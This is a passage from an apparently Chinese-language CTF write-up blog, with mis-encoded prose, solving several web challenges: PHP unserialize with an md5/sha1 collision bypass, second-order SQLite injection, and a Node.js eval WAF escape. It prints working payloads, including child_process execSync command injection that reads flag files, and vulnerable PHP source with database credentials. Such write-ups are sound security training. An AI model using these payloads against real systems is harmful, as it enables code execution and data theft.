language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$str</span>=~(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;?&gt;&lt;?=include ~&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;?&gt;&quot;</span>,<span class="number">1</span>);<span class="variable">$y</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;?&gt;&lt;?=include ~&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;?&gt;&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;syc=<span class="variable">$x</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;lover=<span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“ä¸ºå•¥ä¸èƒ½`whoami&#96;è¿™æ ·è¾“å‡ºï¼Œå¥‡æ€ª</p>
<p>é‚£å°±åªèƒ½includeäº†ï¼Œä½†æ˜¯å¼•å·è¢«è¿‡æ»¤ï¼Œä¸¤æ¬¡å–åæ¥ç»•è¿‡ã€‚</p>
<h2 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h2><p>äºŒæ¬¡æ³¨å…¥åŠ sqliteæ³¨å…¥ï¼Œä¸æ˜¯å¾ˆç†Ÿæ‚‰</p>
<p>äºŒæ¬¡æ³¨å…¥çš„æ­¥éª¤ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªadminâ€™â€“+è¿›å»ï¼Œå‘ç°æœ‰ä¸ªä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹å¯†ç å¤„å°†adminâ€™â€“+æ”¾è¿›å»ï¼Œé‚£ä¹ˆæ”¹çš„å°±æ˜¯adminçš„å¯†ç ï¼Œç›´æ¥æ‹¿ä¸‹adminï¼Œè¿›å»sqliteæ³¨å…¥å°±è¡Œï¼Œè¿™é‡Œç”¨pythonè„šæœ¬æˆ–è€…sqlmapéƒ½æ˜¯å¯ä»¥çš„ï¼</p>
<h2 id="GFCTF-2021-ez-calc"><a href="#GFCTF-2021-ez-calc" class="headerlink" title="[GFCTF 2021]ez_calc"></a>[GFCTF 2021]ez_calc</h2><p>f12ç½‘é¡µæºç è¿™ç§å­˜åœ¨è¿™æ ·çš„ä»£ç </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toLowerCase</span>() !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toUpperCase</span>() === <span class="string">&#x27;ADMIN&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">passwd</span> === <span class="string">&#x27;admin123&#x27;</span>)&#123;</span><br><span class="line">       <span class="comment">// ç™»å½•æˆåŠŸï¼Œè®¾ç½® session</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œctrl+uæˆ–è€…å³é”®æŸ¥çœ‹ç½‘é¡µæºä»£ç æ˜¯çœ‹ä¸åˆ°è¿™æ®µçš„ã€‚</p>
<p>è¿™é‡Œé‡‡ç”¨nodejsçš„å¤§å°å†™ç‰¹æ€§æ¥ç»•è¿‡ï¼Œnodejsç¬”è®°é‡Œæœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admÄ±n</span><br></pre></td></tr></table></figure>

<p>ç™»é™†è¿›å»åæ˜¯ä¸€ä¸ªcalcç•Œé¢ï¼ŒåŒæ ·f12æŸ¥çœ‹æºä»£ç è·å–æºç </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = req.<span class="property">body</span>.<span class="property">calc</span>;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.<span class="property">split</span><span class="string">``</span>.<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.<span class="title function_">slice</span>(i + <span class="number">1</span>, calc.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æˆªå–</span></span><br><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="comment">//å»ç©º</span></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°æ˜çš„åŒå­¦è¿‡æ»¤äº†ä¸€äº›æ¯”è¾ƒå±é™©çš„ä¸œè¥¿</span></span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;sh&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;ln&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;ln&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;fs&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;fs&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;x&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="built_in">eval</span>(calc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216165920626.png" alt="image-20241216165920626"></p>
<p>è¿™é‡Œå¯ä»¥è°ƒè¯•ä¸€ä¸‹ï¼Œæ–¹ä¾¿çœ‹ï¼</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216170014770.png" alt="image-20241216170014770"></p>
<p>æˆ‘ä»¬å‘ç°æ˜¯å¯ä»¥é€ƒé€¸å‡ºæ¥çš„ï¼Œå› ä¸ºå–çš„calc[i]æ˜¯å¤§äºä¸€ä½çš„ï¼Œè€Œ.splitå‡ºæ¥åªæœ‰ä¸€ä½ï¼Œæ‰€ä»¥æ˜¯ä¸ç›¸ç­‰çš„ã€‚å¯ä»¥åˆ©ç”¨æ­¤å¤„çš„æ¼æ´æ¥è¿›è¡Œé€ƒé€¸ã€‚</p>
<p>è®©è¿™ä¸ªå•ç‹¬çš„ä¸€ä½åœ¨å¾ˆåé¢å°±è¡Œï¼Œå¤§äºè¦é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å³å¯ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216173859525.png" alt="image-20241216173859525" style="zoom: 67%;" />

<p>è¿™é‡Œæœ¬æ¥æƒ³ç›´æ¥cat &#x2F;xxxxxx.flagï¼Œä½†æ˜¯å­˜åœ¨é•¿åº¦é™åˆ¶ï¼Œå¤±è´¥ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br></pre></td></tr></table></figure>

<p>æƒ³åŠæ³•ï¼Œè¿™é‡Œç”¨æ˜Ÿå·ä¸å¯ä»¥</p>
<p>åŒæ—¶è¿‡æ»¤äº†xï¼Œä¸èƒ½ç”¨execï¼Œä½†æ˜¯è¿™å¯ä»¥ç»•è¿‡ï¼</p>
<p>è¿™é‡Œæœ¬æ¥æƒ³ç€ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œä½†æ˜¯ä¸å¯ä»¥ï¼Œå®æµ‹</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216174248130.png" alt="image-20241216174248130"></p>
<p>æˆ‘æƒ³å¯èƒ½æ˜¯å› ä¸ºå·²ç»åœ¨forå¾ªç¯ä¸­è¢«è§£æå‡ºæ¥äº†ï¼Œå°±å·²ç»æ˜¯xäº†ï¼Œè€Œå¯¹xçš„æ£€æµ‹å†æœ€åï¼Œæ‰€ä»¥æ²¡æ³•ç»•è¿‡</p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§æ–¹æ³•ã€‚å› ä¸ºæˆ‘ä»¬é€šè¿‡requireå¯¼å…¥çš„æ¨¡å—æ˜¯ä¸€ä¸ªObjectï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡Object.valuesè·å–åˆ°child_processé‡Œé¢çš„å„ç§æ–¹æ³•ï¼Œé‚£ä¹ˆå†é€šè¿‡æ•°ç»„ä¸‹æ ‡[5]å°±å¯ä»¥å¾—åˆ°execSyncäº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString();</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šç”±äºé•¿åº¦é™åˆ¶ï¼Œå› æ­¤åªèƒ½é€šè¿‡å†™æ–‡ä»¶å’Œè¯»æ–‡ä»¶åˆ†ç¦»æ¥è·å–flagäº†ï¼</p>
<h2 id="CISCN-2019ååŒ—Day1-Web1"><a href="#CISCN-2019ååŒ—Day1-Web1" class="headerlink" title="[CISCN 2019ååŒ—Day1]Web1"></a>[CISCN 2019ååŒ—Day1]Web1</h2><p>æ‰“å¼€åæ˜¯ä¸€ä¸ªæ³¨å†Œ+ç™»å½•ç•Œé¢ï¼Œé‡åˆ°è¿™ç§æƒ…å†µä¸€èˆ¬éƒ½æ˜¯å…ˆæ³¨å†Œå†ç™»é™†è¿›å»çš„ï¼Œæ¥ä¸‹æ¥å¯èƒ½æœ‰æƒé™çš„æå‡ç­‰ç­‰ã€‚</p>
<p>è¿›å»åå‘ç°ä¸‰ä¸ªåŠŸèƒ½ç‚¹ã€‚</p>
<ul>
<li>ä¸Šä¼ æ–‡ä»¶</li>
<li>ä¸‹è½½æ–‡ä»¶</li>
<li>åˆ é™¤æ–‡ä»¶</li>
</ul>
<p>æˆ‘ä»¬å‘ç°ä¸‹è½½æ–‡ä»¶å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217102936436.png" alt="image-20241217102936436" style="zoom: 67%;" />

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°å­˜åœ¨ä¸€ä¸ªclass.phpæ–‡ä»¶ï¼Œæºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span 